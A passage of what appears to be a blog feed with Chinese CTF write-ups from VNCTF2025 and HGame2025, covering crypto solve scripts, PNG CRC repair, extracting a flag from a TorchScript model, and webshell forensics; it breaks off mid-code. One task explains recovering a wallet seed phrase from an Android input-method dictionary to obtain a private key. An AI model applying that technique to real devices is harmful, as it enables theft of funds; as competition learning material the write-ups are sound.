class="number">17199707718762989481733793569240992776243099972784327196212023936622130204798694753865087501654381623876011128783229020278210160383185417670794284015692458326761011808048967854332413536183785458993128524881447529380387804712214305034841856237045463243243451585619997751904403447841431924053651568039257094910</span>, <span class="number">62503976674384744837417986781499538335164333679603320998241675970253762411134672614307594505442798271581593168080110727738181755339828909879977419645331630791420448736959554172731899301884779691119177400457640826361914359964889995618273843955820050051136401731342998940859792560938931787155426766034754760036</span>, <span class="number">93840121740656543170616546027906623588891573113673113077637257131079221429328035796416874995388795184080636312185908173422461254266536066991205933270191964776577196573147847000446118311985331680378772920169894541350064423243733498672684875039906829095473677927238488927923581806647297338935716890606987700071</span>)</span><br><span class="line"></span><br><span class="line">v1, v2, v3 = result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算5^m mod n</span></span><br><span class="line">inv_209 = inverse(<span class="number">209</span>, n)</span><br><span class="line">pow5m = (v3 * inv_209) % n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算5的逆元</span></span><br><span class="line">inv5 = inverse(<span class="number">5</span>, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建线性同余方程求解m</span></span><br><span class="line">K = (pow5m * inv5 * <span class="number">209</span>) % n</span><br><span class="line">D = (pow5m * <span class="number">208</span> - v2) % n</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    inv_K = inverse(K, n)</span><br><span class="line"><span class="keyword">except</span> ValueError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;K没有逆元，无法求解m&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">m = (D * inv_K) % n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证第三个方程以确保m正确</span></span><br><span class="line">inv2 = inverse(<span class="number">2</span>, n)</span><br><span class="line"></span><br><span class="line">term1 = (pow5m * <span class="number">2025</span>) % n</span><br><span class="line"></span><br><span class="line">term2 = (m * inv5 % n) * pow5m % n</span><br><span class="line">term2 = (term2 * <span class="number">208</span>) % n</span><br><span class="line"></span><br><span class="line">term3 = (-m * pow5m % n) * <span class="number">209</span> % n</span><br><span class="line"></span><br><span class="line">term4_part = (m * (m - <span class="number">1</span>) % n) * inv2 % n</span><br><span class="line">term4 = term4_part * pow5m % n</span><br><span class="line">term4 = term4 * (inv5 * inv5 % n) % n</span><br><span class="line">term4 = (term4 * <span class="number">209</span>) % n</span><br><span class="line">term4 = (-term4) % n</span><br><span class="line"></span><br><span class="line">total = (term1 + term2 + term3 + term4) % n</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> total != v1 % n:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;计算出的m未通过v1验证，可能存在问题&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    flag = long_to_bytes(m)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密得到的flag为:&quot;</span>, flag)</span><br><span class="line"><span class="comment">#VNCTF&#123;WWhy_diagonalization_1s_s0_brRRRrRrrRrrrRrRRrRRrrrRrRrRuUuUUUTTTtte3333?????ouch!ouch!Th3t_is_S0_Crazy!!!!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="复现部分"><a href="#复现部分" class="headerlink" title="复现部分"></a>复现部分</h2><h3 id="echo-flowers"><a href="#echo-flowers" class="headerlink" title="echo_flowers"></a>echo_flowers</h3><p>imToken这个软件没有漏洞，因此是无法得知私钥的。在软件中可以看到账号是通过助记词导入的，因此猜测恢复助记词方法与输入法有关。</p><p>在android-7.1- r5&#x2F;data&#x2F;data&#x2F;com.sohu.inputmethod.sogouoem&#x2F;files&#x2F;dict中找到词库</p><p><img src="/images/VNCTF2025-Writeup/image-20250216165256719.png" alt="image-20250216165256719"></p><p>词库中字符是以utf-16编码存储的，用strings解一下得到助记词</p><p><img src="/images/VNCTF2025-Writeup/image-20250216170106186.png" alt="image-20250216170106186"></p><p>正常进imToken导入一遍助记词即可创建钱包设置密码查看私钥</p><p>VNCTF{6433c196bb66b0d8ce3aa072d794822fd87edfbc3a30e2f2335a3fb437eb3cda}</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> VNCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGame2025 Writeup</title>
      <link href="/posts/cf182765/"/>
      <url>/posts/cf182765/</url>
      
        <content type="html"><![CDATA[<blockquote><p>由于有点忙，只看了下week1，week2没空看了，就签了个到:(</p><p>还是学到了挺多东西的:)</p></blockquote><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><h3 id="TEST-NC"><a href="#TEST-NC" class="headerlink" title="TEST NC"></a>TEST NC</h3><img src="/images/HGame2025-Writeup/image-20250204110335189.png" alt="image-20250204110335189" style="zoom:50%;" /><h3 id="从这里开始的序章"><a href="#从这里开始的序章" class="headerlink" title="从这里开始的序章"></a>从这里开始的序章</h3><p><img src="/images/HGame2025-Writeup/image-20250204110440698.png" alt="image-20250204110440698"></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Hakuya-Want-A-Girl-Friend"><a href="#Hakuya-Want-A-Girl-Friend" class="headerlink" title="Hakuya Want A Girl Friend"></a>Hakuya Want A Girl Friend</h3><p>一眼压缩包，把十六进制导入010，看到结尾有个倒过来的png</p><p><img src="/images/HGame2025-Writeup/image-20250204110704834.png" alt="image-20250204110704834"></p><p>提取出这个png以后发现crc有问题，爆破一下正确的宽高</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&quot;1.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()    <span class="comment">#填入图片名</span></span><br><span class="line">crc32frombp = <span class="built_in">int</span>(crcbp[<span class="number">29</span>:<span class="number">33</span>].<span class="built_in">hex</span>(),<span class="number">16</span>)    </span><br><span class="line"><span class="built_in">print</span>(crc32frombp)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):                       </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):                    </span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + \</span><br><span class="line">            struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="comment"># print(crc32)</span></span><br><span class="line">        <span class="keyword">if</span>(crc32 == crc32frombp):</span><br><span class="line">            <span class="built_in">print</span>(i, j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p><img src="/images/HGame2025-Writeup/image-20250204110953878.png" alt="image-20250204110953878"></p><p><img src="/images/HGame2025-Writeup/image-20250204111036510.png" alt="image-20250204111036510"></p><p>找到解压密码，解压得到flag</p><p><img src="/images/HGame2025-Writeup/image-20250204111132330.png" alt="image-20250204111132330"></p><h3 id="Level-314-线性走廊中的双生实体"><a href="#Level-314-线性走廊中的双生实体" class="headerlink" title="Level 314 线性走廊中的双生实体"></a>Level 314 线性走廊中的双生实体</h3><p>先确认一下模型结构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line">entity = torch.jit.load(<span class="string">&#x27;entity.pt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> name, module <span class="keyword">in</span> entity.named_modules():</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">linear1</span></span><br><span class="line"><span class="string">security</span></span><br><span class="line"><span class="string">relu</span></span><br><span class="line"><span class="string">linear2</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>security层的代码中涉及了flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line">entity = torch.jit.load(<span class="string">&#x27;entity.pt&#x27;</span>)</span><br><span class="line">security_layer = entity.security</span><br><span class="line"><span class="built_in">print</span>(security_layer.code)</span><br></pre></td></tr></table></figure><p>security层代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self,</span></span><br><span class="line"><span class="params">    x: Tensor</span>) -&gt; Tensor:</span><br><span class="line">  _0 = torch.allclose(torch.mean(x), torch.tensor(<span class="number">0.31415000000000004</span>), <span class="number">1.0000000000000001e-05</span>, <span class="number">0.0001</span>)</span><br><span class="line">  <span class="keyword">if</span> _0:</span><br><span class="line">    _1 = annotate(<span class="type">List</span>[<span class="built_in">str</span>], [])</span><br><span class="line">    flag = self.flag</span><br><span class="line">    <span class="keyword">for</span> _2 <span class="keyword">in</span> <span class="built_in">range</span>(torch.<span class="built_in">len</span>(flag)):</span><br><span class="line">      b = flag[_2]</span><br><span class="line">      _3 = torch.append(_1, torch.<span class="built_in">chr</span>(torch.__xor__(b, <span class="number">85</span>)))</span><br><span class="line">    decoded = torch.join(<span class="string">&quot;&quot;</span>, _1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hidden:&quot;</span>, decoded)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">bool</span>(torch.gt(torch.mean(x), <span class="number">0.5</span>)):</span><br><span class="line">    _4 = annotate(<span class="type">List</span>[<span class="built_in">str</span>], [])</span><br><span class="line">    fake_flag = self.fake_flag</span><br><span class="line">    <span class="keyword">for</span> _5 <span class="keyword">in</span> <span class="built_in">range</span>(torch.<span class="built_in">len</span>(fake_flag)):</span><br><span class="line">      c = fake_flag[_5]</span><br><span class="line">      _6 = torch.append(_4, torch.<span class="built_in">chr</span>(torch.sub(c, <span class="number">3</span>)))</span><br><span class="line">    decoded0 = torch.join(<span class="string">&quot;&quot;</span>, _4)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Decoy:&quot;</span>, decoded0)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">  <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure><p>为什么要费心输入呢，直接输出flag它不香么()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(i^<span class="number">85</span>) <span class="keyword">for</span> i <span class="keyword">in</span> torch.jit.load(<span class="string">&#x27;entity.pt&#x27;</span>).security.flag))</span><br><span class="line"><span class="comment">#flag&#123;s0_th1s_1s_r3al_s3cr3t&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Computer-cleaner"><a href="#Computer-cleaner" class="headerlink" title="Computer cleaner"></a>Computer cleaner</h3><p>题目</p><p><img src="/images/HGame2025-Writeup/image-20250204112046437.png" alt="image-20250204112046437"></p><p>给了个虚拟机，直接vmware挂载</p><p>不用多想，直奔&#x2F;var&#x2F;www&#x2F;html先看看</p><p><img src="/images/HGame2025-Writeup/image-20250204112251917.png" alt="image-20250204112251917"></p><p>uploads&#x2F;shell.php里面找到第一段flag</p><p><img src="/images/HGame2025-Writeup/image-20250204112346641.png" alt="image-20250204112346641"></p><p>查看upload_log.txt，找到攻击者ip</p><p><img src="/images/HGame2025-Writeup/image-20250204112422363.png" alt="image-20250204112422363"></p><p>访问一下就可以看到第二段flag</p><p><img src="/images/HGame2025-Writeup/image-20250204112454353.png" alt="image-20250204112454353"></p><p>从上面的日志中还可以看出第三段flag的位置</p><p><img src="/images/HGame2025-Writeup/image-20250204112627198.png" alt="image-20250204112627198"></p><h3 id="Computer-cleaner-plus"><a href="#Computer-cleaner-plus" class="headerlink" title="Computer cleaner plus"></a>Computer cleaner plus</h3><p>想ps的时候发现没权限，给了权限以后就看到后门程序了(?</p><p><img src="/images/HGame2025-Writeup/image-20250210220834558.png" alt="image-20250210220834558"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="sieve"><a href="#sieve" class="headerlink" title="sieve"></a>sieve</h3><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">b&#x27;hgame&#123;xxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(FLAG)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trick</span>(<span class="params">k</span>):</span><br><span class="line">    <span class="keyword">if</span> k &gt; <span class="number">1</span>:</span><br><span class="line">        mul = prod(<span class="built_in">range</span>(<span class="number">1</span>,k)) </span><br><span class="line">        <span class="keyword">if</span> k - mul % k - <span class="number">1</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> euler_phi(k) + trick(k-<span class="number">1</span>) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> euler_phi(k) + trick(k-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = q = nextprime(trick(e^<span class="number">2</span>//<span class="number">6</span>)&lt;&lt;<span class="number">128</span>)</span><br><span class="line">n = p * q</span><br><span class="line">enc = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;enc=&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment">#enc=2449294097474714136530140099784592732766444481665278038069484466665506153967851063209402336025065476172617376546</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一看就是算法爷出的题</p><p>用杜教筛算欧拉函数的前缀和，直接把<a href="https://oi-wiki.org/math/number-theory/du/#__tabbed_2_2">oi-wiki</a>的代码拿来用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">int</span> MAXN = <span class="number">2000010</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> T, n, pri[MAXN], cur, mu[MAXN], sum_mu[MAXN];</span><br><span class="line"><span class="type">bool</span> vis[MAXN];</span><br><span class="line">map&lt;<span class="type">long</span> <span class="type">long</span>, <span class="type">long</span> <span class="type">long</span>&gt; mp_mu;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">S_mu</span><span class="params">(<span class="type">long</span> <span class="type">long</span> x)</span> </span>&#123;  <span class="comment">// 求mu的前缀和</span></span><br><span class="line">  <span class="keyword">if</span> (x &lt; MAXN) <span class="keyword">return</span> sum_mu[x];</span><br><span class="line">  <span class="keyword">if</span> (mp_mu[x]) <span class="keyword">return</span> mp_mu[x];  <span class="comment">// 如果map中已有该大小的mu值，则可直接返回</span></span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> ret = (<span class="type">long</span> <span class="type">long</span>)<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">long</span> <span class="type">long</span> i = <span class="number">2</span>, j; i &lt;= x; i = j + <span class="number">1</span>) &#123;</span><br><span class="line">    j = x / (x / i);</span><br><span class="line">    ret -= <span class="built_in">S_mu</span>(x / i) * (j - i + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> mp_mu[x] = ret;  <span class="comment">// 路径压缩，方便下次计算</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">S_phi</span><span class="params">(<span class="type">long</span> <span class="type">long</span> x)</span> </span>&#123;  <span class="comment">// 求phi的前缀和</span></span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> ret = (<span class="type">long</span> <span class="type">long</span>)<span class="number">0</span>;</span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> j;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">long</span> <span class="type">long</span> i = <span class="number">1</span>; i &lt;= x; i = j + <span class="number">1</span>) &#123;</span><br><span class="line">    j = x / (x / i);</span><br><span class="line">    ret += (<span class="built_in">S_mu</span>(j) - <span class="built_in">S_mu</span>(i - <span class="number">1</span>)) * (x / i) * (x / i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (ret - <span class="number">1</span>) / <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  cin.<span class="built_in">tie</span>(<span class="literal">nullptr</span>)-&gt;<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">  cin &gt;&gt; T;</span><br><span class="line">  mu[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; MAXN; i++) &#123;  <span class="comment">// 线性筛预处理mu数组</span></span><br><span class="line">    <span class="keyword">if</span> (!vis[i]) &#123;</span><br><span class="line">      pri[++cur] = i;</span><br><span class="line">      mu[i] = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= cur &amp;&amp; i * pri[j] &lt; MAXN; j++) &#123;</span><br><span class="line">      vis[i * pri[j]] = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">if</span> (i % pri[j])</span><br><span class="line">        mu[i * pri[j]] = -mu[i];</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        mu[i * pri[j]] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; MAXN; i++)</span><br><span class="line">    sum_mu[i] = sum_mu[i - <span class="number">1</span>] + mu[i];  <span class="comment">// 求mu数组前缀和</span></span><br><span class="line">  <span class="keyword">while</span> (T--) &#123;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">S_phi</span>(n) &lt;&lt; <span class="string">&#x27; &#x27;</span> &lt;&lt; <span class="built_in">S_mu</span>(n) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//155763335410704472</span></span><br></pre></td></tr></table></figure><p>然后用埃拉托斯特尼筛计算质数个数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">count_primes</span>(<span class="params">limit</span>):</span><br><span class="line">    is_prime = np.ones(limit + <span class="number">1</span>, dtype=<span class="built_in">bool</span>)</span><br><span class="line">    is_prime[<span class="number">0</span>:<span class="number">2</span>] = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> current <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">int</span>(np.sqrt(limit)) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> is_prime[current]:</span><br><span class="line">            is_prime[current*current:limit+<span class="number">1</span>:current] = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> np.<span class="built_in">sum</span>(is_prime)</span><br><span class="line">upper_limit = (<span class="number">65537</span>**<span class="number">2</span>) // <span class="number">6</span></span><br><span class="line">prime_count = count_primes(upper_limit)</span><br><span class="line">result=<span class="number">155763335410704472</span>+<span class="built_in">int</span>(prime_count)</span><br><span class="line">enc=<span class="number">2449294097474714136530140099784592732766444481665278038069484466665506153967851063209402336025065476172617376546</span></span><br><span class="line">p=nextprime(result&lt;&lt;<span class="number">128</span>)</span><br><span class="line">phi=p*(p-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(<span class="number">65537</span>,phi)</span><br><span class="line">m=long_to_bytes(<span class="built_in">pow</span>(enc,d,p*p))</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment">#hgame&#123;sieve_is_n0t_that_HArd&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Compress-dot-new"><a href="#Compress-dot-new" class="headerlink" title="Compress dot new"></a>Compress dot new</h3><p>根据题意用ai一把梭</p><p>题目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def &quot;into b&quot; [] &#123;let arg = $in;0..(( $arg|length ) - 1)|each &#123;|i|$arg|bytes at $i..$i|into int&#125;&#125;;def gss [] &#123;match $in &#123;&#123;s:$s,w:$w&#125; =&gt; [$s],&#123;a:$a,b:$b,ss:$ss,w:$w&#125; =&gt; $ss&#125;&#125;;def gw [] &#123;match $in &#123;&#123;s:$s,w:$w&#125; =&gt; $w,&#123;a:$a,b:$b,ss:$ss,w:$w&#125; =&gt; $w&#125;&#125;;def oi [v] &#123;match $in &#123;[] =&gt; [$v],[$h,..$t] =&gt; &#123;if $v.w &lt; $h.w &#123;[$v,$h] ++ $t&#125; else &#123;[$h] ++ ($t|oi $v)&#125;&#125;&#125;&#125;;def h [] &#123;match $in &#123;[] =&gt; [],[$n] =&gt; $n,[$f,$sn,..$r] =&gt; &#123;$r|oi &#123;a:$f,b:$sn,ss:(($f|gss) ++ ($sn|gss)),w:(($f|gw) + ($sn|gw))&#125;|h&#125;&#125;&#125;;def gc [] &#123;def t [nd, pth, cd] &#123;match $nd &#123;&#123;s:$s,w:$_&#125; =&gt; ($cd|append &#123;s:$s,c:$pth&#125;),&#123;a:$a,b:$b,ss:$_,w:$_&#125; =&gt; &#123;t $b ($pth|append 1) (t $a ($pth|append 0) $cd)&#125;&#125;&#125;;t $in [] []|each &#123;|e|&#123;s:$e.s,cs:($e.c|each &#123;|c|$c|into string&#125;|str join)&#125;&#125;&#125;;def sk [] &#123;match $in &#123;null =&gt; null,&#123;s:$s,w:$_&#125; =&gt; &#123;s:$s&#125;,&#123;a:$a,b:$b,ss:$_,w:$_&#125; =&gt; &#123;a:($a|sk),b:($b|sk)&#125;&#125;&#125;;def bf [] &#123;$in|into b|reduce -f (0..255|reduce -f [] &#123;|i,a|$a|append 0&#125;) &#123;|b,a|$a|update $b (($a|get $b) + 1)&#125;|enumerate|filter &#123;|e|$e.item &gt; 0&#125;|each &#123;|e|&#123;s:$e.index,w:$e.item&#125;&#125;&#125;;def enc [cd] &#123;$in|into b|each &#123;|b|$cd|filter &#123;|e|$e.s == $b&#125;|first|get &quot;cs&quot;&#125;|str join&#125;;def compress []: binary -&gt; string &#123;let t = $in|bf|h;[($t|sk|to json --raw), ($in|enc ($t|gc))]|str join &quot;\n&quot;&#125;</span><br><span class="line"></span><br><span class="line"># source compress.nu; open ./flag.txt --raw | into binary | compress | save enc.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>enc.txt</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 